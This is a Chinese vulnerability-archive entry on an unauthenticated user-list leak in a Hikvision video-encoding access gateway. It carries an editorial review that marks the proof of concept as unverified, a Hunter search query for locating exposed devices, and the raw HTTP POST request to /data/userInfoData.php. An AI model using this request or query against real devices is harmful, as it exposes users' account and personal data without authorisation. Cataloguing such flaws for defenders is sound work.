---
source: "wy876 漏洞文库"
id: "vw-99dbd1c3bcfbd4cab7f3c36e"
entity_id: "ve-99dbd1c3bcfbd4cab7f3c36e"
schema_version: "1"
title: "海康威视视频编码设备接入网关userinfodata接口存在信息泄漏漏洞"
product: "Hikvision视频编码设备接入网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie，page1/rows20，固件未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3userinfodata%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zq2np1ubh0igzfoa"
source_status: "recorded"
previous_fofa_unverified: "web.title="
hunter: "web.title=\"视频编码设备接入网关\"&&app.name==\"Hikvision 海康威视视频编码设备接入网关\""
---

# 海康威视视频编码设备接入网关userinfodata接口存在信息泄漏漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision视频编码设备接入网关
- 本文讨论：data/userInfoData.php分页用户资料读取
- 版本、权限与配置前提：无Cookie，page1/rows20，固件未知
- 资料类型：用户列表泄露PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 无返回字段，不清是否明文密码/摘要/普通用户信息，不能扩大成账号接管
- 空Origin/Referer必要性未讲；标题大小写与真实userInfoData应统一
- YAML外链未审、元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 返回数据、匿名权限、附件模板和固件范围待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
海康威视视频编码设备接入网关userinfodata接口存在信息泄漏漏洞。

# 二、影响版本
+ HIKVISION 视频编码设备接入网关

# 三、资产测绘
+ hunter：`web.title="视频编码设备接入网关"&&app.name=="Hikvision 海康威视视频编码设备接入网关"`


+ 登录页面


# 四、漏洞复现
```http
POST /data/userInfoData.php HTTP/1.1
Host: 
Content-Length: 38
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin:
Referer:
Accept-Language: zh-CN,zh;q=0.9
Connection: close

page=1&rows=20&sort=userId&order=asc
```


[hikvision-spbmjrwg-userinfodate-info.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1711075901506-37d4c294-7138-466e-b8bb-17d265f17fe6.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zq2np1ubh0igzfoa>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
